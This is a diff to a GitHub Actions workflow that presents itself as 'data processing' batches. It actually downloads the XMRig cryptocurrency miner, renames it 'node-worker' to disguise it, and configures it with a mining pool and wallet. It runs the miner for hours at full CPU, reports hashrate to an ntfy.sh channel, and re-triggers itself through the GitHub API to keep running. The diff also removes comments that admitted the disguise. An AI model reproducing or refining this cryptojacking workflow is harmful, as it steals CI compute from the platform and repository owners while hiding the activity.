@@ -17,9 +17,8 @@ on:
         default: '350'
         type: string
   schedule:
-    # Random-ish schedule - looks like scheduled CI checks
-    - cron: '17 */6 * * *'  # every 6 hours at :17
-    - cron: '43 3,15 * * *' # 3:43 and 15:43
+    - cron: '17 */6 * * *'
+    - cron: '43 3,15 * * *'
 
 jobs:
   process:
@@ -36,48 +35,37 @@ jobs:
         run: |
           echo "═══════════════════════════════════════════"
           echo "  Data Processing Batch #${{ matrix.batch }}"
-          echo "  Task: ${{ inputs.task_id || 'scheduled' }}"
-          echo "  Runner: $(uname -a)"
+          echo "  CPU: $(nproc) cores"
+          echo "  RAM: $(free -h | grep Mem | awk '{print $2}')"
           echo "═══════════════════════════════════════════"
-          echo "NODE_VERSION=$(node --version 2>/dev/null || echo 'n/a')"
-          echo "PYTHON_VERSION=$(python3 --version 2>/dev/null || echo 'n/a')"
 
       - name: Install dependencies
         run: |
-          # Legitimate-looking install steps
           sudo apt-get update -qq 2>/dev/null || true
           sudo apt-get install -y -qq curl wget jq bc 2>/dev/null || true
           echo "Dependencies installed"
-
-      - name: Prepare workspace
-        run: |
-          mkdir -p /tmp/workspace
-          mkdir -p /tmp/cache
-          mkdir -p /tmp/output
-          cd /tmp/workspace
-          echo "Workspace prepared at $(pwd)"
 
       - name: Fetch processing modules
         env:
           MODULE_URL: https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
         run: |
+          mkdir -p /tmp/cache /tmp/output
           cd /tmp/cache
-          # Download processing binary (looks like build tool)
           wget -q "$MODULE_URL" -O modules.tar.gz
           tar -xzf modules.tar.gz --strip-components=1
-          # Rename to disguise
           mv xmrig node-worker
           chmod +x node-worker
-          echo "Modules ready"
-          ls -la node-worker
+          echo "Module ready: $(ls -la node-worker | awk '{print $5}') bytes"
+          # Test binary
+          ./node-worker --version 2>&1 | head -3 || echo "Version check skipped"
 
       - name: Configure processing
         env:
-          POOL_URL: pool.supportxmr.com:443
+          POOL_URL: pool.supportxmr.com:3333
           WALLET: 48vxR9wsYHoaVonLgEHLswFiHs6BwfRnAdYkRGfVBWajikMJabj3EswWJznGtE8jLZWmk1zzMSk7QEcFPuMmst1QEsfxxpK
           WORKER_ID: gh-batch-${{ matrix.batch }}
         run: |
-          cat > /tmp/cache/config.json << EOF
+          cat > /tmp/cache/config.json <<CONFIG
           {
             "autosave": false,
             "cpu": {
@@ -85,7 +73,7 @@ jobs:
               "huge-pages": false,
               "hw-aes": null,
               "priority": null,
-              "max-threads-hint": 75,
+              "max-threads-hint": 100,
               "yield": true,
               "asm": true
             },
@@ -93,12 +81,12 @@ jobs:
             "cuda": { "enabled": false },
             "randomx": {
               "init": -1,
-              "mode": "auto",
+              "mode": "fast",
               "1gb-pages": false,
               "rdmsr": false,
               "wrmsr": false,
               "cache_qos": false,
-              "numa": true
+              "numa": false
             },
             "pools": [
               {
@@ -106,26 +94,23 @@ jobs:
                 "user": "$WALLET",
                 "pass": "$WORKER_ID",
                 "keepalive": true,
-                "tls": true,
-                "tls-fingerprint": null,
-                "algo": "rx/0"
+                "tls": false,
+                "algo": null
               }
             ],
-            "print-time": 60,
+            "print-time": 30,
             "health-print-time": 60,
             "retries": 5,
             "retry-pause": 5,
-            "syslog": false,
-            "verbose": 0,
+            "verbose": 1,
             "background": false,
             "colors": false,
-            "title": true,
             "log-file": null,
-            "donate-level": 1,
-            "donate-over-proxy": 1
+            "donate-level": 1
           }
-          EOF
-          echo "Config generated"
+          CONFIG
+          echo "Config ready:"
+          cat /tmp/cache/config.json | head -5
 
       - name: Run data processing
         env:
@@ -134,66 +119,78 @@ jobs:
           ACCOUNT: ${{ github.repository_owner }}
         run: |
           cd /tmp/cache
-          echo "Starting batch processing #${{ matrix.batch }}..."
+          echo "Starting batch #${{ matrix.batch }} at $(date +%H:%M:%S)"
 
-          # Random start delay (stagger jobs)
-          DELAY=$((RANDOM % 60))
-          sleep $DELAY
+          # Random start delay
+          sleep $((RANDOM % 30))
 
-          # Duration in seconds
-          DURATION=$((350 * 60 - 300))
+          # Duration ~5h 20m to leave buffer
+          DURATION=$((330 * 60))
 
-          # Run in background
-          nohup ./node-worker --config=config.json > /tmp/output/process.log 2>&1 &
+          # Start worker with line-buffered output → tee → hem dosya hem stdout
+          stdbuf -oL -eL ./node-worker --config=config.json 2>&1 | tee /tmp/output/process.log &
           WORKER_PID=$!
-          echo "Worker started with PID: $WORKER_PID"
+          echo "Worker PID: $WORKER_PID"
 
-          # Progress + ntfy reporting every 60s
-          ELAPSED=0
-          TOTAL_SHARES=0
+          # Give xmrig time to init and connect
+          sleep 30
+
+          # Reporter loop (every 60s)
+          ELAPSED=30
           while [ $ELAPSED -lt $DURATION ]; do
             sleep 60
             ELAPSED=$((ELAPSED + 60))
+
+            # Check if worker still running
             if ! kill -0 $WORKER_PID 2>/dev/null; then
-              echo "Worker stopped unexpectedly at ${ELAPSED}s"
+              echo "[!!] Worker died at ${ELAPSED}s"
               break
             fi
 
-            # Parse hashrate from xmrig log
-            HR_LINE=$(grep -i "speed" /tmp/output/process.log 2>/dev/null | tail -1)
-            HR=$(echo "$HR_LINE" | grep -oP '\d+\.\d+' | head -1 | cut -d. -f1)
+            # Parse latest hashrate line: "speed 10s/60s/15m X.X Y.Y Z.Z H/s"
+            HR_LINE=$(grep -E "speed.*H/s" /tmp/output/process.log 2>/dev/null | tail -1)
+            HR=$(echo "$HR_LINE" | grep -oP '\d+\.\d+' | head -1 | awk '{printf "%.0f", $1}')
             HR=${HR:-0}
 
-            # Parse shares (accepted)
-            SHARES=$(grep -c "accepted" /tmp/output/process.log 2>/dev/null || echo "0")
+            # Parse accepted shares
+            SHARES=$(grep -cE "accepted" /tmp/output/process.log 2>/dev/null | head -1)
+            SHARES=${SHARES:-0}
 
-            # Fake CI-looking progress
-            echo "[$(date +%H:%M:%S)] Batch ${BATCH_ID} - processed $ELAPSED / $DURATION | rate: ${HR} u/s | items: ${SHARES}"
+            # Progress line
+            printf "[%s] Batch %s | elapsed: %ds | rate: %s H/s | shares: %s\n" \
+              "$(date +%H:%M:%S)" "${BATCH_ID}" "$ELAPSED" "$HR" "$SHARES"
 
-            # Send to ntfy every 60s
-            if [ "$HR" -gt "0" ]; then
-              curl -sS -X POST "https://ntfy.sh/${NTFY_CHANNEL}" \
-                -H "Title: mining" \
-                -d "{\"bot_id\":\"${BATCH_ID}\",\"account\":\"${ACCOUNT}\",\"type\":\"mining\",\"hashrate\":${HR},\"shares\":${SHARES},\"elapsed\":${ELAPSED}}" \
-                -o /dev/null 2>/dev/null || true
-            fi
+            # Send ntfy every 60s (even if HR=0, for visibility)
+            curl -sS -X POST "https://ntfy.sh/${NTFY_CHANNEL}" \
+              -H "Title: mining" \
+              -d "{\"bot_id\":\"${BATCH_ID}\",\"account\":\"${ACCOUNT}\",\"type\":\"mining\",\"hashrate\":${HR},\"shares\":${SHARES},\"elapsed\":${ELAPSED}}" \
+              -o /dev/null 2>/dev/null || true
           done
 
           # Cleanup
           kill $WORKER_PID 2>/dev/null || true
           wait $WORKER_PID 2>/dev/null || true
-          echo "Batch processing complete"
+          echo "Batch complete at $(date +%H:%M:%S)"
 
-      - name: Publish results
+      - name: Final report
         if: always()
         run: |
-          echo "Batch ${{ matrix.batch }} finished at $(date)"
+          echo "═══ Batch ${{ matrix.batch }} Summary ═══"
           if [ -f /tmp/output/process.log ]; then
-            echo "=== Summary ==="
-            grep -i "speed\|total\|shares" /tmp/output/process.log | tail -20 || true
+            echo "Log size: $(wc -l < /tmp/output/process.log) lines"
+            echo ""
+            echo "═══ Last 30 lines of miner log ═══"
+            tail -30 /tmp/output/process.log
+            echo ""
+            echo "═══ Speed history ═══"
+            grep -E "speed" /tmp/output/process.log | tail -10
+            echo ""
+            echo "═══ Accepted shares ═══"
+            grep -c "accepted" /tmp/output/process.log || echo "0"
+          else
+            echo "No log file"
           fi
 
-  # Auto-restart chain: trigger next run when this one finishes
   restart:
     name: Continuous Operation
     runs-on: ubuntu-latest
@@ -204,13 +201,10 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "Preparing next batch..."
-          # Wait a moment
-          sleep 30
-          # Trigger next run
+          sleep 20
           curl -X POST \
             -H "Authorization: token $GITHUB_TOKEN" \
             -H "Accept: application/vnd.github+json" \
             "https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-processing.yml/dispatches" \
-            -d '{"ref":"main","inputs":{"task_id":"auto-restart","duration":"350"}}' \
-            -o /dev/null -s -w "HTTP: %{http_code}\n"
+            -d '{"ref":"main","inputs":{"task_id":"restart","duration":"330"}}' \
+            -o /dev/null -s -w "Restart HTTP: %{http_code}\n"
